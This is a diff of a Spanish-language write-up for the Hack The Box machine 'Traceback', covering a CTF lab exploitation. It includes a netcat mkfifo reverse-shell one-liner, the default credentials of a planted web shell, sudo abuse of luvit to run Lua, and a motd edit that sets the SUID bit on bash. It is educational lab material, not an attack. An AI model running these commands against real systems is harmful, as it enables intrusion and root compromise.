@@ -37,7 +37,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 69.06 seconds
 ```
-Después lanzaré scripts de enumeración básicos para detectar el servicio y la versión de los puertos descubiertos.
+Después lanzaré scripts de enumeración básicos para detectar el servicio y la versión de los puertos abiertos.
 
 ```
 intrusionz3r0@kali:~$ nmap -sCV -p22,80,4488 -oN targeted traceback.htb
@@ -62,23 +62,27 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 El escaneo determinó lo siguiente:
 
-* Puerto 22 SSH: Para este puerto no podemos hacer mucho debido a que no contamos con ningunas credenciales aun y ademas la version del servicio no esta asociada a ninguna vulnerabilidad.
+* Puerto 22 `SSH`: Para este puerto no podemos hacer mucho debido a que no contamos con ningunas credenciales aun y ademas la version del servicio no esta asociada a ninguna vulnerabilidad.
 
-* Puerto 4488 awacs-ice: Parece ser que los scripts de enumeración no pudieron encontrar con exactitud cual es el servicio que se ejecuta para este puerto.
-*Puerto 80 HTTP: Nuestro único vector de entrara es el puerto 80, así que vamos a enumerar este servicio.
+* Puerto `4488`: awacs-ice: Parece ser que los scripts de enumeración no pudieron encontrar con exactitud cual es el servicio que se ejecuta para este puerto.
+
+* Puerto 80 `HTTP`: Nuestro único vector de entrara es el puerto 80, así que vamos a enumerar este servicio.
 
 ## Enumeración puerto 80.
 
 Cuando nos dirigimos al servicio HTTP nos encontramos con lo siguiente:
-**![](https://lh4.googleusercontent.com/KW-jOo3dcAWt-RSLkrRj_KfkjECXHFpdwZ2OgE70Su_PjQ3tmp91Gpzbs0vlvYhZmXW7FV8UE2V8BNkT7yD67VAzJNBE9K4r4PeA1JULLjy3GmdXzKhy4sWeUphzH23rP9CEO2--)**
+**![](https://lh4.googleusercontent.com/KW-jOo3dcAWt-RSLkrRj_KfkjECXHFpdwZ2OgE70Su_PjQ3tmp91Gpzbs0vlvYhZmXW7FV8UE2V8BNkT7yD67VAz
+JNBE9K4r4PeA1JULLjy3GmdXzKhy4sWeUphzH23rP9CEO2--)**
 Rápidamente utilizo la herramienta `whatweb` para ver que información podemos extraer.
+
 **![](https://lh3.googleusercontent.com/zpnanPw3kZfe_qjyT8D5zPAjMD30qXT2SyNhHhQLXSzHu3ygSPII52y90neg6cZ5F_CyGoTxWVsTQ5fGyG7GGvsMPTMs33H2BFbeNDceMMmp4rzli4m-fgrhYYHiPxLXstwTjlcx)**
-Bien, al ver que no logramos extraer información útil, mi siguiente paso es revisar el codigo fuente en busca de pistas ya que esta máquina es muy estilo CTF.
+
+Bien, al ver que no logramos extraer información útil, mi siguiente paso es revisar el codigo fuente en busca de pistas ya que esta máquina es muy al estilo CTF.
 ```html
 <body>
 	<center>
 		<h1>This site has been owned</h1>
-		<h2>I have left a backdoor for all the net. FREE 		INTERNETZZZ</h2>
+		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
 		<h3> - Xh4H - </h3>
 		<!--Some of the best web shells that you might need ;)-->
 	</center>
@@ -87,8 +91,10 @@ Bien, al ver que no logramos extraer información útil, mi siguiente paso es re
 > **Consejo:**  Siempre revisar el código fuente de una máquina en hackthebox debido a que muchas veces encontramos cosas bastante interesantes.
 
 Rápidamente me dirijo a google y hago la siguiente búsqueda:
-**![](https://lh3.googleusercontent.com/G7qTTLjeBBFb6P0YmTx3xHZUWu7ZzOANED1K16jKU8KZwAlfMOgmaWAvt-NLDJ3W6HTdXAVnty7_1qURzuvv0YN-nicEetdESRjAHnb6TUXwoyylY1_au1_Icdgl2uiPIc3Oo3_q)**
-**![](https://lh5.googleusercontent.com/oD3634EatIlLSHq8mFIaThYhKePAZaM6ataSf1_CG7AxlQQ3sgxbpmfc5xmHRrfXxOWiefT8VZV9T_xYALOAeplE4neaVhcc4xrVRlN0BBwv7gP-Vii9YYpxzM3TDCfEoiwg21BL)**
+
+**![Busqueda en google](https://lh3.googleusercontent.com/G7qTTLjeBBFb6P0YmTx3xHZUWu7ZzOANED1K16jKU8KZwAlfMOgmaWAvt-NLDJ3W6HTdXAVnty7_1qURzuvv0YN-nicEetdESRjAHnb6TUXwoyylY1_au1_Icdgl2uiPIc3Oo3_q)**
+
+**![Página de github](https://lh5.googleusercontent.com/oD3634EatIlLSHq8mFIaThYhKePAZaM6ataSf1_CG7AxlQQ3sgxbpmfc5xmHRrfXxOWiefT8VZV9T_xYALOAeplE4neaVhcc4xrVRlN0BBwv7gP-Vii9YYpxzM3TDCfEoiwg21BL)**
 
 
 Creo un diccionario con las webshell's que se encuentran aqui para posteriormente realizar un búsqueda de directorios.
@@ -118,36 +124,52 @@ Processed Requests: 30
 Filtered Requests: 29
 Requests/sec.: 36.68870
 ```
-Al parecer hemos encontrado algo, vamos a ello.
+Encontramos `smevk.php`.
+
 **![](https://lh3.googleusercontent.com/i9zR7oMDaEZeGveDHpgxefhfriSCSm8Dh4j75ThE9y_7FHTYgpN_3iTmUYghAHi8cqbPL9yXSxlzXHZuCpnHDTxRR61UaCgPlFhdrkNh2MX2bgoanhFARsZTT21-UnJo3PAcuwY7)**
-Reviso el codigo de [smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php) y encuentro las credenciales de acceso.
+
+Reviso el código de [smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php) y encuentro las credenciales de acceso.
 
 ```
 $UserName = "admin"; //Your UserName here.
 $auth_pass = "admin"; //Your Password.
 ```
+
+Rápidamente utilizo las credenciales para acceder a la webshell.
+
 **![](https://lh5.googleusercontent.com/i50UVMTplYetCaVXNCtDgzvjMIyreh3Y9CdHzZSBSxzigFLCfHH6LdYw15cGUAz5CSJFSHpoIQ4DmA59iPoMpZrjrozczM07v3MncN3WENGdgUovB5S5wP7hS7p3brtBlO95yzOt)**
+
 Hecho un vistazo y me percato de que es posible ejecutar comandos por lo que me lanzo una reverse shell utilizando netcat.
 
 ```console
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PUERTO] >/tmp/f
 ```
-## Shell como el usuario webadmin.
 
-De las primeras cosas que hago cuando entro a la máquina es revisar cuales son los comandos que tenemos permitidos ejecutar a nivel usuario.
-**![](https://lh5.googleusercontent.com/zxhN1n2FWEdcdXTPaHVZyd8INaEycLP0FGqfxaoPSnEEeeCc5oDvNFPoe-RvQlBpMYDLrVawLl4R3zoSPeU1MAGl-0_V8haZ6IfdK4BA25HdxXZ-VdqGFmrtjXMII8-pKan0bI1T)**
-Al parecer podemos ejecutar un binario llamado `luvit` como el usuario `sysadmin`.
+**![](https://lh5.googleusercontent.com/8CZ__2uAbRbZ7ByPO9Jl99uPzNNasTMiFceGYZtKIu1jEz-JDCQNiYC9cm_u_0Ls5DPHl8acuC7TvljxcwZS-Aely8cwYbSJG89QOReKfopYN33RS-H2ZrVO3S6vPek3nFXhkFxH)**
+
+**![](https://lh3.googleusercontent.com/2m5uBVMaatCGJqTMeRloycGhGZjaqQeRiL7vqBgvBCeAE1uB74M92PLORdBcphIYsA3PE9wiZ4P8pd2urieO9E3FF9R53k05Eb7VKaUffhnNLHCm3D0G4VF7giaRfIURtvSR-EYx)**
+
+## Shell como el usuario webadmin.
 
 Me dirijo a mi directorio y encuentro una nota bastante interesante:
 
-**Note.txt:**
 > *sysadmin*  
 Me ha dejado una herramienta para practicar Lua. 
-Estoy seguro de que sabe dónde encontrarlo.
+Estoy seguro de que sabe dónde encontrarla.
 Contáctame si tienes alguna pregunta.
 
-Si ejecuto el binario luvit podemos observar que este nos va a permitir lograr ejecutar scripts en lua por lo que nuestro objetivo será escalar al usuario `sysadmin` utilizando el lenguaje de scripting lua.
+Tenemos una pista de por donde va el asunto.
+
+Una de las primeras cosas que hago cuando entro a la máquina es revisar cuales son los comandos que tenemos permitidos ejecutar a nivel usuario.
+
+**![](https://lh5.googleusercontent.com/zxhN1n2FWEdcdXTPaHVZyd8INaEycLP0FGqfxaoPSnEEeeCc5oDvNFPoe-RvQlBpMYDLrVawLl4R3zoSPeU1MAGl-0_V8haZ6IfdK4BA25HdxXZ-VdqGFmrtjXMII8-pKan0bI1T)**
+Al parecer podemos ejecutar un binario llamado `luvit` como el usuario `sysadmin`.
+
+
 **![](https://lh6.googleusercontent.com/qEhH9bY9Hn8Z8ELwvvDNgpcJ8SDHF1uTqWBEfKBLvRaoV6aoGtJejBqcA5ARaQkOGHnSUhuJ-8zloLLaJqDUesTELmlub9NSFRGWU71mOJdB7_dZ-MidC-2Ua96iOkdVgX5iLlVF)**
+
+Si ejecuto el binario luvit podemos observar que este nos va a permitir lograr ejecutar scripts en lua por lo que nuestro objetivo será escalar al usuario `sysadmin` utilizando el lenguaje de scripting lua.
+
 Visito la página: [gtfobins](https://gtfobins.github.io/gtfobins/lua/) para buscar la manera de escalar.
 
 ## Shell como el usuario sysadmin.
@@ -156,9 +178,15 @@ Visito la página: [gtfobins](https://gtfobins.github.io/gtfobins/lua/) para bus
 webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/bash')"
 sysadmin@traceback:/home/webadmin$
 ```
+## Escalar a root via motd.
+
 Eso fue muy fácil, me dirijo a la ruta de `/dev/shm` y me paso un script de enumeración llamado [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
 **![](https://lh3.googleusercontent.com/zgGuuJQjFTWp4cvFMcku3ljKvsdMM1d81NJ4c4jeU9-W6UboC0rJ0tvO-I0KHSxe0q4ehH7POLL38gQGNZQwJD7GZ1z_5sFn3aEHyLTu7nOkNsS_unZ-Nm5mPrbJOIoO0OTFitLY)**
 Bien lo que mas me llama la atención es que nosotros como el usuario `sysadmin` podemos escribir en el archivo motd.
+
+**¿Que es motd?**
+
+Motd es un archivo de unix que su función es enviar un mensaje de bienvenida a todos los usuarios que se conectan al sistema, esto es muy común en autenticación ssh para recibir a los usuario con un mensaje.
 
 si revisamos los permisos:
 ```console
@@ -171,9 +199,8 @@ total 24
 -rwxrwxr-x 1 root sysadmin  299 Aug 13 17:46 91-release-upgrade
 sysadmin@traceback:/dev/shm$
 ```
-## Escalar a root via motd.
+Vemos que efectivamente tenemos permisos de escritura y que ademas el usuario propietario es el usuario `root` por lo que la escalada a root esta bastante regalada.
 
-Vemos que tenemos permisos de escritura y que ademas el usuario propietario es el usuario `root` por lo que la escalada a root esta bastante regalada.
 
 * Copio mi clave SSH pública y la voy a colocar en el archivo `authorized_keys` del usuario sysadmin.
 
@@ -182,22 +209,18 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ....... intrusionz3r0@Intrusionz3r0" > /home
 ```
 
 * Después aprovechandonos de que tenemos permisos de escritura en el motd lo modificare para que al final del script me ejecute un comando que me configure el bit SUID al binario `/bin/bash` para que esta se pueda ejecutar como el usuario `root`.
+
 ```
 sysadmin@traceback:/etc/update-motd.d$ echo "chmod u+s /bin/bash" >> 00-header
 ```
 
-
-
-
-
-![](https://lh5.googleusercontent.com/a2QOu2rjahQ53iobcTrtRHDhRlMjT3TC2f3uUQcT0YSlyFOpaaVn8vnIKqi5bN9P3WCzMxnbUyI10B-cvbMWhTsd92QA5fRNyuGPyfDE6JoNZy0HlcF37Jwk76ckuEaA2ixYpsPo)
-
-
+Ahora solo iniciamos por ssh.
 
 ```console
 intrusionz3r0@kali:~$  ssh sysadmin@traceback.htb
 $ bash -p
 ```
+
 **![](https://lh5.googleusercontent.com/oKFfbncZH_zEwmajE7HL4z3wTWpx8DNwHhzutN0FFFDGvgxz_vFEcD5XYpf9AGupZmK15C-zNcw7SNTFo3E5NmFfq1vMzs2yAABxtqFy4eiGODuI7xTlNy4JvcKmPeHen4bUAVXl)**
 
 **¡¡Somos root!!**
@@ -207,7 +230,9 @@ $ bash -p
 
 ## Autopwn.
 
-Esto no acaba aquí, vamos a construirnos un autopwn utilizando python. Asignamos la cabecera, importamos los paquetes a utilizar y asignamos un puerto con el que vamos a estar trabajando.
+Esto no acaba aquí, vamos a construirnos un autopwn utilizando python. 
+
+Asignamos la cabecera, importamos los paquetes a utilizar y asignamos un puerto con el que vamos a estar trabajando.
 
 ```python
 #!/usr/bin/env python3
